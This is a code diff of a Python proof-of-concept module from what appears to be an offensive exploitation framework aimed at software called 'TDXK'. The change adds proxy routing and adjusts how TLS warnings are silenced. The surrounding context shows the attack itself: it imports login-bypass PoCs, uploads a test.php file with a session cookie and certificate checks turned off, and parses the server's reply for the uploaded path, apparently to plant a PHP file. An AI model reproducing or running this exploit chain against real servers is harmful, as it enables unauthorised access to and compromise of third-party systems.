@@ -3,14 +3,14 @@
 
 import requests
 import re
-import requests.packages.urllib3
 import io
+
+from Config.config_proxies import proxies
 from Config.config_requests import ua
 from Moudle.TDXK.TDXK_Any_user_login import poc as poc1
 from Moudle.TDXK.TDXK_online_user_login import poc as poc2
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -80,7 +80,7 @@ def poc(target,cookie=None):
             "Cookie": cookie,
             "Connection": "close"
         }
-        target_res = requests.post(upload_url, headers=headers, files=target_tmp_file, verify=False, timeout=5)
+        target_res = requests.post(upload_url, headers=headers, files=target_tmp_file, verify=False, timeout=5,proxies=proxies)
         res_text = target_res.text
         if "test.php" in res_text and "SUCCESS" in res_text:
             target_tmp_path = re.findall('@(\d+)_', str(res_text))[0]
@@ -96,7 +96,7 @@ def poc(target,cookie=None):
             "Cookie": cookie,
             "Connection": "close"
         }
-        target_res = requests.post(upload_url, headers=headers, files=target_tmp_file, verify=False, timeout=5)
+        target_res = requests.post(upload_url, headers=headers, files=target_tmp_file, verify=False, timeout=5,proxies=proxies)
         res_text = target_res.text
         if "test.php" in res_text and "SUCCESS" in res_text:
             target_tmp_path = re.findall('@(\d+)_', str(res_text))[0]
